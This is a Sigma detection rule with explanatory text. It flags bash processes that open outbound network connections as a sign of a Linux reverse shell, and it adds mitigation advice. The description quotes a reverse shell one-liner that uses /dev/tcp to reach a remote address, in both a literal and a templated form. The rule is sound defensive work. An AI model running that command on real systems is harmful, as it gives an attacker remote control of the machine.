https://github.com/SigmaHQ/sigma/blob/a99b163c93b265db1ab3e771930b6b97c3c703c5/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml#L1

Linux Reverse Shell Indicator
Description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
             This detection identifies potential Linux reverse shell activity by monitoring network connections initiated by bash. 
             Attackers often use commands like bash -i >& /dev/tcp/[IP]/[Port] 0>&1 to establish remote access, allowing them to execute commands on the compromised system. 
             Since reverse shells are commonly used in post-exploitation, this behavior may indicate command-and-control (C2) activity and should be investigated immediately.

Mitigation:
Restrict Outbound Traffic: Block unauthorized outbound connections, especially to untrusted IPs and ports.
Monitor Process Activity: Use EDR/SIEM tools to track unusual bash executions and network activity.
Apply Least Privilege: Limit user permissions to prevent unauthorized script execution.
Use Intrusion Detection Systems (IDS): Deploy tools like Snort or Suricata to detect reverse shell patterns.
Regular Patching: Keep systems updated to mitigate vulnerabilities that allow reverse shell execution.

==================================================
title: Linux Reverse Shell Indicator
id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
status: test
description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
references:
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
author: Florian Roth (Nextron Systems)
date: 2021-10-16
modified: 2022-12-25
tags:
    - attack.execution
    - attack.t1059.004
logsource:
    product: linux
    category: network_connection
detection:
    selection:
        Image|endswith: '/bin/bash'
    filter:
        DestinationIp:
            - '127.0.0.1'
            - '0.0.0.0'
    condition: selection and not filter
falsepositives:
    - Unknown
level: critical
